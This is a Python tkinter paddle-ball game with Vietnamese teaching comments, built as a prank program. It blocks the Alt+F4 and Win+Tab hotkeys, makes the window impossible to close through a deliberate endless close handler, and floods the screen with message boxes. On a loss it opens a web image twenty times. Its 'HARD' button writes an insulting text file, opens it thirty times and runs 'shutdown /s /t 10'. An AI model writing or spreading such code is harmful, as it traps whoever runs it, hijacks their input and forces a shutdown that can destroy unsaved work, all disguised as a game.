import tkinter as tk, time, os, subprocess as sb, webbrowser as wb, keyboard as key, random as rd
#  import module GUI tkinter , time , os( module giúp can thiệp file hệ thống ), subprocess ( chức năng tương tự os nhưng mạnh hơn), webbrower(truy cập web )
# keboard ( bàn phím), random
from tkinter import messagebox
# từ module tkinter import hộp thoại thông báo
key.add_hotkey("alt + f4", lambda: None , suppress =True)# block thse key 
key.add_hotkey("windows + tab", lambda: None, suppress =True)# block these key 
master = tk.Tk() # tạo 1 cửa sỏ tkinter
colours  = ['blue', 'white', 'pink', 'yellow', 'red', 'green', 'purple', 'orange', 'brown']
master.title('Game wrote by TMT')# tiêu đề cửa sổ 
w = tk.Canvas(master, width=760, height=570, bg=rd.choice(colours)) # Canvas là 1 module nhỏ về GUI của tkinter . nó giúp tạo 1 bảng với các tọa độ tính theo pixel
# width( chiều rộng), height(chiều dài ), rd.choie(clours) = chọn ngẫu nhiên 1 màu trong biến colours làm màu bg .
w.pack() # hàm pack giúp hiển thị bảng Canvas vừa tạo với kích thước màu sắc đã được chọn
w.create_rectangle(152, 57, 608, 171, fill=rd.choice(colours))
# hàm create_rectangle giúp tạo 2 HCN với kích thước tọa độ pixel xác định
# global dùn để gọi biến toàn cục, tức laf khi biến khi báo ngoài hàm muốn đưa vào trong hàm 
# nonlocal dùng để gọi biến cục bộ khi 2 hàm lồng nhau > 

def onClick2():
    ''' do phải định nghĩa hàm trước khi sử dụng luôn nên mới viết lên trên này :V  nên các bác đọc bên dưới trước nhé '''
    info = tk.messagebox.showinfo(title='wrote by TMT', message='Hê lô đây là game do 1 noob dev viết ')
    info2 = tk.messagebox.showinfo(title='wrote by TMT', message='Đồ họa hơi cùi NHƯNG viết méo hề đơn giản :))')
    info3 = tk.messagebox.showinfo(title='wrote by TMT', message='Game chỉ có 1 chế độ NORMAL và nó sẽ tăng dần độ khó lên !')
    info8 = tk.messagebox.showinfo(title='wrote by TMT', message='Đỡ được 20 phát bóng sẽ thắng :)) ')
    info4 = tk.messagebox.showinfo(title='wrote by TMT', message='Thua sẽ phải chịu 1 hình phạt. còn hình phạt như nào thua khác biết >')
    info7 = tk.messagebox.showwarning(title='wrote bt TMT', message='HÌNH PHẠT KHÔNG DÀNH CHO NHỮNG NGƯỜI DỄ QUẠO VÀ NGHIÊM TÚC!')
    info6 = tk.messagebox.showwarning(title='wrote by TMT', message='ĐỪNG CỐ THOÁT GAME THEO CÁCH BÌNH THƯỜNG')
    info5 = tk.messagebox.showinfo(title='wrote by TMT', message='Ko lằng nhằng nứa vào gêm đi :)) ')
def onClick3():
    for i in range(1,1000):
        exit = tk.messagebox.showerror(title='wrote by TMT', message='MUỐN THOÁT ANH HẢ KHÔNG DỄ ZỊ ĐÂU ENTER 1000 LẦN ĐI :>>>> ')

''' đọc tiếp ở đây xong trên kia '''
w.create_text((380,110),fill='red', font='times 28', text='SIMP GAME ', width=500) #  tạo 1 text với kích thước tọa độ đã xác định 
button = tk.Button(master, text='START', font='times 28',width=10 , command=w.destroy)# hàm Button(giúp tạo 1 nút bấm với câu lệnh và kích thước yêu cầu)
button1 = tk.Button(master, text='CLICK ME', font='times 28',width=10, command=onClick2 ) 
button2 = tk.Button(master, text='EXIT', font='times 28',width=10, command=onClick3)


def onClick1():
    '''cái này cũng vậy nè đọc ở dưới lên nha '''
    global w
    w.destroy()# phá hủy Canvas để có chỗ hiển thị cho CanVas mới
    sc = tk.Canvas(master,width=760,height=570,bg=rd.choice(colours))
    sc.pack()
    # ta cần có gậy , bóng , kỉ lục , tốc độ tăng theo thời gian
    bat = sc.create_rectangle(0,0,55,10,fill=rd.choice(colours)) # tạo gậy
    ball = sc.create_oval(0,0,40,40,fill=rd.choice(colours))# tạo bóng
    masterOpen = True # set 1 biến kiểm tra xem cửa sổ tk có đóng hay không 
    score  = 0
    speed = 0
    def main_loop():
        nonlocal masterOpen
        while masterOpen == True: # khi của  mở 
            move_bat()# hàm này giúp di chuyển gậy sẽ định nghĩa ở phía dưới
            move_ball()# hàm này giúp di chuyển bóng 
            master.update()# hàm update() cập nhật hình ảnh do mỗi 1 cú click là 1 frame hình ảnh đc show ra 
            # nên ta phải cập nhật liên tục các hình ảnh để tạo chuyển động 
            time.sleep(0.02)# lệnh này ngăn trò chơi quá nhanh khiến mắt không theo kịp chuyển động
            if masterOpen == True: # kiểm tra xem mỗi lần cập nhật thì cửa sổ tk có đóng không vì nếu bóng ra ngoài cửa sổ  sẽ đóng 
                check_over()
    rightpress = 0 # tạo 2 biến để ghi nhớ và thực hiện mỗi lần click 
    leftpress = 0
    def on_key_press(event):
        nonlocal rightpress, leftpress
        if event.keysym == 'Right': # event.keysym là sự kiện click 1 phím bất kì trên keyboard 
            rightpress = 1 # khi click mũi tên phải thì tăng 1 
        elif event.keysym == 'Left':# tương tự 
            leftpress = 1
    def on_key_release(event):# khi mà key không đc nhấn nữa 
        nonlocal rightpress, leftpress
        if event.keysym == 'Right': # đặt lại 
            rightpress = 0
        elif event.keysym == 'Left':
            leftpress = 0
    batspeed = 6 # biến để đặt khoảng cách mà vợt di chuyển sau mỗi cú click
    def move_bat():
        batMove = batspeed*rightpress - batspeed*leftpress # cái này lq đến tọa độ của canvas 
        # gt gọn là khi nhấn mũi tên phải thì tọa độ x của vợt sẽ dịch phải qua 6 pixel , và ngược lại 
        (batLeft, batTop, batRight, batBottom)=sc.coords(bat)# lệnh .coord() là để lấy tọa độ hiện tại của bat
        #|trái|,|trên trái|,|phải|,|dưới phía bên phải| 
        if (batLeft >  0 or batMove > 0) and (batRight < 760 or batMove < 0):# khi mà vợt không chạm vào giới hạn khung canvas 
            sc.move(bat, batMove, 0)# hàm move(tên đối tượng , độ dài di chuyển, tọa độ y nếu k dichuyeenr thì để 0 ) giúp di chuyển đối tượng
    ballmoveX = 3 #  bóng di chuuyeenf trái phỉa 
    ballmoveY = -3# bóng di chuyển trên dưới . vì sao phải cho bằng 3 vì nếu cho nhỏ quá thì di chuyển chậm quá và nếu to quá thì di chuyển nhanh quá :)) 
    setBatTop =  570 - 40# tọa độ cảu vợt khi vào game  và chiều rộng của gậy luôn 
    setBatBottom = 570 - 30
    def move_ball():
        nonlocal ballmoveX, ballmoveY, sc, score, speed, batspeed
        (ballLeft, ballTop, ballRight, ballBottom) = sc.coords(ball)# hàm coords() trả về tọa độ chính xác của bóng vật đã đc định nghĩa bên trên ý :V 
        # 4 cái biến này là biến tọa độ của 4 phần bóng gồm trái trên phải dưới chổ này giải thích hơi khó hiểu vì phải vẽ hình ra mói hiểu đc ae cố tưởng tượng nha 
        if ballmoveX > 0 and ballRight > 760: # ý nghĩa câu nầy là khi ballmove x > 0 tức là x vẫn ở trong bảng và ball right > 760 là khi bóng nó đập vào thành bên phải rồi cb văng ra ngoài thì : 
            # bật ngc lại
            ballmoveX = -ballmoveX
        if ballmoveX < 0 and ballLeft < 0:# tương tự
            ballmoveX = -ballmoveX
        if ballmoveY < 0 and ballTop <0:
            ballmoveY = -ballmoveY
            # tất cả dòng lệnh trên là khi bóng chạm vào phạm vi của thành canvas thì sẽ nảy ra 
        if ballmoveY > 0 and ballBottom > setBatTop and ballBottom < setBatBottom:
            (batLeft , batTop, batRight, batBottom) = sc.coords(bat)  # ý nghĩa câu này là cho xin ít tạo độ chính xác của thằng gậy đee
            if (ballmoveX>0 and (ballRight + ballmoveX)> batLeft and ballLeft< batRight or ballmoveX < 0 and (ballRight>batLeft and ballLeft+ballmoveX<batRight)): 
                # ae tự hiểu câu này nhé nó tương tự như câu trên thôi chả gt nhiều dài lém 
                # câu if này có nghĩa là khi bóng chạm vào vợt thì 
                ballmoveY = -ballmoveY # di chuyển
                score = score + 1 # kỉ lục tăng
                speed = speed + 2 # sau mấy lần chạm thì tăng 
                if speed == 4:# này chỉ sau 2 lần chạm là tăng 
                    speed = 0# set về 0 để nó tăng mãi sau 2 lần chạm :>>
                    batspeed = batspeed + 4 # tăng tốc độ gậy
                    if ballmoveX > 0: # tăng tốc độ bóng khi di chuyển 
                        ballmoveX = ballmoveX + 4
                    else:
                        ballmoveX = ballmoveX - 4
                    ballmoveY = ballmoveY - 4
        sc.move(ball, ballmoveX, ballmoveY) # hàm move(tên vật, đi tới tọa độ x, y ) giúp di chuyển vật xác định tọa độ 
    def check_over():
        nonlocal score
        (ballLeft ,ballTop, ballRight, ballBottom) = sc.coords(ball)
        if ballTop > 570: # khi bóng ra ngoài 
            if score >= 10: 
                soc = tk.messagebox.showinfo(title='CONGRAT YOU WIN', message='YOU WIN BROO NOW U CAN GET OUT OF THIS GAME OR PLAY AGAIN') 
                wb.open('https://mediaonlinevn.com/wp-content/uploads/2020/12/210101-happy-new-year-mediaonline_resize.jpg')
                playagain = tk.messagebox.askyesno(message='PLAY AGAIN ? (WARN!: DONT CHOSE NO )')
                if playagain == True:
                    reset()
                else: 
                    des()
            if score < 10 : 
                soc = tk.messagebox.showinfo(title='wrote by TMT', message=('YOUR SCORE IS ' + str(score) + ' have to try so much '))
                play = tk.messagebox.showwarning(title='wrote by TMT', message='OPPS!! YOU LOSE THE GAME ! NOW TAKE THIS ! ')
                for i in range(0,20):
                    wb.open('https://mediaonlinevn.com/wp-content/uploads/2020/12/210101-happy-new-year-mediaonline_resize.jpg')
                playagain = tk.messagebox.askyesno(message='PLAY AGAIN ? (WARN!: DONT CHOSE NO )')
                if playagain == True:
                    reset()
                else:
                    close()
    def des():
        nonlocal masterOpen
        des = tk.messagebox.showinfo(title='wrote by TMT', message='GOOD BYE SEE YOU NEXT TIME AND LOVE YOU ! ')
        masterOpen = False
        master.destroy()
    def close():
        close = tk.messagebox.showwarning(title='wrote by TMT', message="OPPS YOU CHOSE THE WRONG SIDE :> NOW THERE'S ONLY ONE WAY TO GET OUT OF THIS GAME :))")
        nonlocal masterOpen
        masterOpen = False
        onClick() # chỗ này là 1 bug để khiến cho thằng 'master.protocol('WM_DELETE_WINDOW', close) ' bên dưới  không thể liên kết với nút close [x]
        # và nó sẽ gây ra vòng lặp vĩnh cửu ở hàm close() này :)) 
    def reset(): # khi chọn chơi lại 
        nonlocal leftpress ,rightpress , ballmoveX, ballmoveY,score
        score = 0
        leftpress = 0
        rightpress = 0
        ballmoveX = 4 
        ballmoveY = -4
        sc.coords(bat, 10 ,setBatTop, 50, setBatBottom)
        sc.coords(ball, 20, setBatTop-10, 30, setBatTop)
    master.protocol('WM_DELETE_WINDOW', close) # liên kết với nút close [x]
    master.bind('<KeyPress>', on_key_press)# liên kết các nút điều khiển với bàn phím 
    master.bind('<KeyRelease>', on_key_release)
    reset()
    main_loop()
def onClick4():
    warrn = tk.messagebox.showwarning(title='wrote by TMT', message="YOU HAVEN'T READ THE DESCRIPTION ? TAKE THE PUNISH !!!")
    with open('NOOB.txt','w+') as f : # create an txt file 
        f.write("YOU'RE IDIOT !!!") # write some text in that file 
    for i in range(1,30):
        sb.call(['cmd.exe','/c', 'NOOB.TXT'])
    os.system("shutdown /s /t 10")
def onClick5():
    for i in range(0,30):
        warrn2 = tk.messagebox.showwarning(title='wrote bt TMT', message="oops there no way to comeback :))))")
        warrn3 = tk.messagebox.showwarning(title='wrote by TMT', message=" get back ur game :0")

''' chưa đọc chỗ này. đọc bên dưới xong mới đọc từ đây lên  '''
def onClick(event):
    global  w # hàm global giúp gọi biến cục bộ đã khai báo ở ngoài hàm . vì nếu ko có hàm global này mà đặt luôn biến w vào là err ngay 
    # cho dù khai báo lại biến w thì bản chất 2 biến hoàn toàn khác nhau vì biến ngoài hàm và biến trong hàm hoán toàn khác nhau 
    w.destroy()# hàm destroy() giúp phá hủy cửa sổ vừa tạo 
    playag = tk.messagebox.askyesno(message='HAVE YOU READ THE "CLICK ME " ? ') 
    # nếu user chọn yes 
    if playag == True:
        w=tk.Canvas(master, width=760, height=570, bg=rd.choice(colours))# tạo 1 Canvas mới 
        w.pack()# hiển thịk
        w.create_rectangle(152,57,608,171,fill=rd.choice(colours))# tạo khung mơơis
        w.create_text(380,110,fill='black',font='times 28',text='MODE',width=400)
        button3 = tk.Button(master,text='NORMAL',font='times 28', width=10, command=onClick1) 
        button4 = tk.Button(master,text='HARD',font='times 28', width=10, command=onClick4)
        button5 = tk.Button(master,text='BACK',font='times 28', width=10, command=onClick5)
        canvas_widget = w.create_window(375, 238, window=button4)
        canvas_widget = w.create_window(375, 338, window=button3)
        canvas_widget = w.create_window(375, 438, window=button5)   
    else:# khi user chọn no và 
        onClick2()# thực hiện hàm click2  sau khi click2 xong thực thi 
        w=tk.Canvas(master, width=760, height=570, bg=rd.choice(colours))
        w.pack()
        w.create_rectangle(152,57,608,171,fill=rd.choice(colours))
        w.create_text(380,110,fill='red',font='times 28',text='MODE',width=400)
        button3 = tk.Button(master,text='NORMAL',font='times 28', width=10, command=onClick1)
        button4 = tk.Button(master,text='HARD',font='times 28', width=10, command=onClick4)
        button5 = tk.Button(master,text='BACK',font='times 28', width=10, command=onClick5)
        canvas_widget = w.create_window(375, 238, window=button4)
        canvas_widget = w.create_window(375, 338, window=button3)
        canvas_widget = w.create_window(375, 438, window=button5)   

''' đọc đây lên nè '''
button.bind('<ButtonRelease-1>', onClick) # hàm bind giúp liên kết nút bấm tên 'button' khi đc click vào hàm onCLick()
canvas_widget = w.create_window(375, 238, window=button)# tạo nút bấm và kích thước nút bấm bên trên đã định nghĩa :V 
canvas_widget = w.create_window(375, 338, window=button1)
canvas_widget = w.create_window(375, 438, window=button2)
master.mainloop() # hàm này bắt buộc phải có vì nó hiện thị cửa sổ tkinter nếu k có nố thì sẽ chả có cái mịa gì đc tạo nên cả :V 